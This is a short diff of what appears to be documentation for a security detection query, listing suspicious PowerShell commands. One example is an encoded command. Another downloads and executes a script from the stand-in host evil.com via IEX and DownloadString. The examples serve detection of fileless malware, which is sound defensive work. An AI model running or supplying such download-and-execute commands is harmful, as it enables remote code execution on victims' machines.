@@ -54,6 +54,7 @@ This query searches for:
 Examples of suspicious commands:
   `powershell -EncodedCommand aQBlAHgA`
   `powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')"`
+
 Thes patterns often indicate:
   - fileless malware
   - script-based attacks
